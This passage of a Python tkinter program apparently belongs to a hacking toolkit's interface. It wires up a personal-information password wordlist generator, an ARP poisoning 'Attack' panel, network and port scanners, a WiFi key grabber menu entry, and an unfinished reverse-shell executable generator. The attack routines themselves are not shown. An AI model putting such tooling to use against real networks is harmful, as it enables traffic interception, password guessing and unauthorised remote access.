                            word="%s%s_%s"%(t1,t2,t3)
                            wordlist.append(word)
                            word="%s_%s%s"%(t1,t2,t3)
                            wordlist.append(word)

            
            out1.insert(END, "[+] Wordlist generated")
            out1.insert(END, "\n(wordlist size: %s)"%(len(wordlist)))
            ask=messagebox.askquestion("Save wordlist?", "Size %s"%(len(wordlist)), icon="question")
            save_name=""
            if ask=="yes":
                if (name!="" and surname!=""):
                    save_name="%s_%s"%(name,surname)
                elif name!="":
                    save_name=name
                elif surname!="":
                    save_name=surname
                elif nickname!="":
                    save_name=nickname
                else:
                    save_name="generated_wordlist"
                wl=""
                for w in wordlist:
                    wl+=w
                    wl+="\n"
                save=open("%s.txt"%(save_name), "w")
                save.write(wl)
                save.close()
                path1=os.path.dirname(os.path.abspath(__file__))
                out1.insert(END, '\n\n[+] Wordlist saved as %s.txt at "%s"\n'%(save_name, path1))
                out1.see(END)
            
            ask2=messagebox.askquestion("?", "Print wordlist?", icon="question")
            if ask2=="yes":
                out1.insert(END,"\nWordlist:")
                for w in wordlist:
                    out1.insert(END,"\n%s"%(w))
                    out1.see(END)
            
            
            
        
        gen_w=Button(tool_2, text="Generate", command=get_wordlist ,font=("Courier",12))
        gen_w.place(x=500,y=150, width=100,height=30)

        

        tool_2.mainloop()

        
        
    menu_widget = tk.Menu(root)
    submenu_widget = tk.Menu(menu_widget, tearoff=False)
    submenu_widget.add_command(label="WiFi key grabber",command=submenu_callback1)
    submenu_widget.add_command(label="Wordlist generator",command=submenu_callback)
    menu_widget.add_command(label="Host Table", command=menu_callback)
    menu_widget.add_cascade(label="Other tools",menu=submenu_widget)
    menu_widget.add_command(label="Info",command=menu_callback2)
    root.config(menu=menu_widget)

    def select():
        global state_b, be_verbose
        #print(radioValue.get())
        if radioValue.get()==1:
            mscan.place_forget()
            gshell.place_forget()
            be_verbose=0

            #_______ARP____
            def cArp():
                if checkArp.get()==1:
                    def get_arp():
                        if attack["text"]=="Attack":
                            target_ip=str(tar.get("1.0","end-1c"))
                            gateway_ip=str(gate.get("1.0","end-1c"))
                            out2.delete("1.0","end")
                            attack["text"]="Stop"
                            
                            ar = threading.Thread(target=ArpPoisoningAttack, args=(target_ip, gateway_ip, out2, attack))
                            ar.start()
                        elif attack["text"]=="Stop":
                            attack["text"]="Attack"

                    def update_globals():
                        global show_dns, show_tcp, show_udp, show_arp, show_other
                        if s_arp.get()==1:
                            show_arp=True
                        else:
                            show_arp=False
                        if s_dns.get()==1:
                            show_dns=True
                        else:
                            show_dns=False
                        if s_tcp.get()==1:
                            show_tcp=True
                        else:
                            show_tcp=False
                        if s_udp.get()==1:
                            show_udp=True
                        else:
                            show_udp=False
                        if s_other.get()==1:
                            show_other=True
                        else:
                            show_other=False
                        
                    null2=Label(arp_a, text=" ", bg="gray")
                    null2.pack(padx=200, pady=250)

                    lab1=Label(arp_a, text="Target address:", bg="gray")
                    lab1.config(font=("Courier CE",13))
                    lab1.place(x=0, y=0)

                    tar=Text(arp_a, height=1, width=18, bg="darkgray")
                    tar.place(x=120, y=0)

                    lab2=Label(arp_a, text="Gateway address:", bg="gray")
                    lab2.config(font=("Courier CE",13))
                    lab2.place(x=0, y=50)

                    gateways = netifaces.gateways()
                    default_gateway = gateways['default'][netifaces.AF_INET][0]
                    gate=Text(arp_a, height=1, width=18, bg="darkgray")
                    gate.place(x=140, y=50)
                    gate.insert(END, default_gateway)

                    attack=Button(arp_a, text="Attack", command=get_arp ,font=("Courier",12))
                    attack.place(x=100,y=100, width=100,height=30)

                    out2=Text(arp_a, height=23, width=55, bg="black", fg="white", font=("Courier",8))
                    out2.place(x=0, y=148)

                    lab3=Label(arp_a, text="Show:", bg="gray")
                    lab3.config(font=("Courier CE",13))
                    lab3.place(x=0, y=500)
                
                    s_arp=tk.IntVar()
                    s_dns=tk.IntVar()
                    s_udp=tk.IntVar()
                    s_tcp=tk.IntVar()
                    s_other=tk.IntVar()

                    s1 = Checkbutton(arp_a, text="ARP", variable=s_arp, onvalue=1, offvalue=0, command=update_globals)
                    s1.place(x=50, y=500)
                    s2 = Checkbutton(arp_a, text="DNS", variable=s_dns, onvalue=1, offvalue=0, command=update_globals)
                    s2.place(x=100, y=500)
                    s3 = Checkbutton(arp_a, text="UDP", variable=s_udp, onvalue=1, offvalue=0, command=update_globals)
                    s3.place(x=150, y=500)
                    s4 = Checkbutton(arp_a, text="TCP", variable=s_tcp, onvalue=1, offvalue=0, command=update_globals)
                    s4.place(x=200, y=500)
                    s5 = Checkbutton(arp_a, text="OTHER", variable=s_other, onvalue=1, offvalue=0, command=update_globals)
                    s5.place(x=250, y=500)
                    
                    arp_a.place(x=552, y=150)
                    
                    
                else:
                    arp_a.place_forget()
                    
            checkArp = tk.IntVar()
            a_button = Checkbutton(nscan, text="Arp Poisoning", variable=checkArp, onvalue=1, offvalue=0, command=cArp)
            a_button.place(x=700, y=100)

            #______________
            
            def cverbose():
                global be_verbose
                if checkValue.get()==1:
                    be_verbose="y"
                else:
                    be_verbose="n"

            def get_data():
                global be_verbose
                ipaddr=str(net.get("1.0","end-1c"))
                if sta1.get("1.0","end-1c")=="":
                    ip1=1
                else:
                    ip1=int(sta1.get("1.0","end-1c"))
                if end1.get("1.0","end-1c")=="":
                    ip2=255
                else:
                    ip2=int(end1.get("1.0","end-1c"))
                subn="null"
                if checkValue2.get()==1:
                    subn=str(getnetm.get("1.0","end-1c"))
                out.delete("1.0","end")
                start["state"]="disabled"
                #NetworkScanner(ipaddr, ip1, ip2, be_verbose)
                sc = threading.Thread(target=NetworkScanner, args=(ipaddr, ip1, ip2, be_verbose,out,start,subn,))
                sc.start()
                #out=Text(root, height=30, width=50, bg="black")
                #out.place(x=10, y=380)
                
            lab3=Label(nscan, text="Output:", bg="gray")
            lab3.config(font=("Courier CE",12))
            lab3.place(x=10, y=350)
            
            out=Text(nscan, height=15, width=65, bg="black", fg="white")
            out.place(x=10, y=380)
            
            null1=Label(nscan, text=" ", bg="gray")
            null1.pack(padx=500, pady=300)
            lab1=Label(nscan, text="Network Address:", bg="gray")
            lab1.config(font=("Courier CE",13))
            lab1.place(x=10, y=200)
            #lab1.pack(padx=200)
            
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            #print(default_gateway)
            
            net=Text(nscan, height=1, width=18, bg="darkgray")
            net.place(x=150, y=200)
            net.insert(END, default_gateway)
            
            
            lab2=Label(nscan, text="IP range:          to", bg="gray")
            lab2.config(font=("Courier CE",13))
            lab2.place(x=10, y=240)
            sta1=Text(nscan, height=1, width=3, bg="darkgray")
            sta1.place(x=90, y=240)
            end1=Text(nscan, height=1, width=3, bg="darkgray")
            end1.place(x=150, y=240)

            getnetm=Text(nscan, height=1, width=18, bg="darkgray")
            netm_t=Label(nscan, text="Subnet mask: ", bg="gray")
            netm_t.config(font=("Courier CE",13))
            def getNetmask():
                if checkValue2.get()==1:
                    netm_t.place(x=10, y=320)
                    getnetm.place(x=120, y=320)
                else:
                    netm_t.place_forget()
                    getnetm.place_forget()
            
            checkValue = tk.IntVar()
            checkValue2 = tk.IntVar()

            verbose=tk.Checkbutton(nscan, text='Be verbose',variable=checkValue, onvalue=1, offvalue=0, command=cverbose, bg="darkgray")
            verbose.place(x=10, y=280)

            subnet=tk.Checkbutton(nscan, text='Scan all subnets',variable=checkValue2, onvalue=1, offvalue=0, command=getNetmask, bg="darkgray")
            subnet.place(x=100, y=280)


            start=Button(nscan, text="Start",bg="lightgreen", command=get_data ,font=("Courier",12))
            start.place(x=350,y=240, width=100,height=30)

            nscan.place(x=0, y=0)


            
        elif radioValue.get()==2:    
            nscan.place_forget()
            arp_a.place_forget()
            gshell.place_forget()
            be_verbose=0

            def cverbose():
                global be_verbose
                if checkValue.get()==1:
                    be_verbose="y"
                else:
                    be_verbose="n"

            def cfast():
                global fast
                if checkValue2.get()==1:
                    fast="y"
                else:
                    fast="n"

            def get_data():
                global be_verbose
                ipaddr=str(net.get("1.0","end-1c"))
                po1=int(sta1.get("1.0","end-1c"))
                po2=int(end1.get("1.0","end-1c"))
                out.delete("1.0","end")
                start["state"]="disabled"
                #NetworkScanner(ipaddr, ip1, ip2, be_verbose)
                sc = threading.Thread(target=PortScanner, args=(ipaddr, po1, po2, be_verbose, out, start,))
                sc.start()
                #out=Text(root, height=30, width=50, bg="black")
                #out.place(x=10, y=380)
                
            lab3=Label(mscan, text="Output:", bg="gray")
            lab3.config(font=("Courier CE",12))
            lab3.place(x=10, y=350)
            
            out=Text(mscan, height=15, width=55, bg="black", fg="white")
            out.tag_add("start","1.0","1.3")
            out.tag_configure("start", foreground="green")
            out.place(x=10, y=380)
            
            null1=Label(mscan, text=" ", bg="gray")
            null1.pack(padx=300, pady=300)
            lab1=Label(mscan, text="IP Address:", bg="gray")
            lab1.config(font=("Courier CE",13))
            lab1.place(x=10, y=200)
            #lab1.pack(padx=200)
            net=Text(mscan, height=1, width=18, bg="darkgray")
            net.place(x=110, y=200)
            
            
            lab2=Label(mscan, text="Port range:           to", bg="gray")
            lab2.config(font=("Courier CE",13))
            lab2.place(x=10, y=240)
            sta1=Text(mscan, height=1, width=5, bg="darkgray")
            sta1.place(x=100, y=240)
            end1=Text(mscan, height=1, width=5, bg="darkgray")
            end1.place(x=170, y=240)
            
            checkValue = tk.IntVar()
            checkValue2 = tk.IntVar()

            verbose=tk.Checkbutton(mscan, text='Be verbose',variable=checkValue, onvalue=1, offvalue=0, command=cverbose, bg="darkgray")
            verbose.place(x=10, y=280)
            fastmode=tk.Checkbutton(mscan, text='Fast scan',variable=checkValue2, onvalue=1, offvalue=0, command=cfast, bg="darkgray")
            fastmode.place(x=100, y=280)

            start=Button(mscan, text="Start",bg="lightgreen", command=get_data ,font=("Courier",12))
            start.place(x=350,y=240, width=100,height=30)

            mscan.place(x=0, y=0)

        elif radioValue.get()==3:
            nscan.place_forget()
            arp_a.place_forget()
            mscan.place_forget()
            be_verbose=0
            def getInfo():
                server=str(ip.get("1.0","end-1c"))
                port=str(sta1.get("1.0","end-1c"))
                fname=str(sta2.get("1.0","end-1c"))
                bg_txt["fg"]="red"
                print("Still in dev.")
                labb=Label(gshell, text="Still in dev", bg="gray")
                labb.config(font=("Courier CE",18))
                labb.place(x=200, y=400)
            
            text_icon="""

 aad8888888baa
 d ?88888888888?  8b
 d8888 ?88888888??a888888b
 d8888888a8888888aa8888888888b
 dP        88888888888        Yb
 dP         Y888888888P         Yb
d8           Y8888888P           8b
88            Y88888P            88
Y8baaaaaaaaaa88P T Y88aaaaaaaaaad8P
Y88888888888P  |  Y88888888888P
888   |   888
8888888888888b
88888888888888
d88888888888888
88  88  88   88
88  88  88   88
88  88  P    88
88  88       88

"""
            
            bg_txt=Label(gshell, text=text_icon, bg="gray")
            bg_txt.config(font=("Courier",13))
            bg_txt.place(x=320, y=50)

            null1=Label(gshell, text=" ", bg="gray")
            null1.pack(padx=350, pady=300)
            lab1=Label(gshell, text="Server IP:", bg="gray")
            lab1.config(font=("Courier CE",13))
            lab1.place(x=10, y=200)

            ip=Text(gshell, height=1, width=18, bg="darkgray")
            ip.place(x=90, y=200)

            lab2=Label(gshell, text="Port:", bg="gray")
            lab2.config(font=("Courier CE",13))
            lab2.place(x=10, y=240)
            sta1=Text(gshell, height=1, width=5, bg="darkgray")
            sta1.place(x=50, y=240)

            lab3=Label(gshell, text="Output file name:\t\t\t.exe", bg="gray")
            lab3.config(font=("Courier CE",13))
            lab3.place(x=10, y=280)
            sta2=Text(gshell, height=1, width=19, bg="darkgray")
            sta2.place(x=140, y=280)
            
            start=Button(gshell, text="Generate", bg="lightgray", font=("Courier",12), command=getInfo)
            start.place(x=100,y=350, width=100, height=30)

            gshell.place(x=0, y=0)



    radioValue = tk.IntVar() 
 
    rdioOne = tk.Radiobutton(root, text='Net Scan',
                                 variable=radioValue, value=1, command=select) 
    rdioTwo = tk.Radiobutton(root, text='Port Scan',
                                 variable=radioValue, value=2, command=select)
    rdioThree = tk.Radiobutton(root, text='Reverse Shell',
                                 variable=radioValue, value=3, command=select)

    rdioOne.place(x=50, y=100)
    rdioTwo.place(x=150, y=100)
    rdioThree.place(x=250, y=100)


    root.mainloop()
    

main()
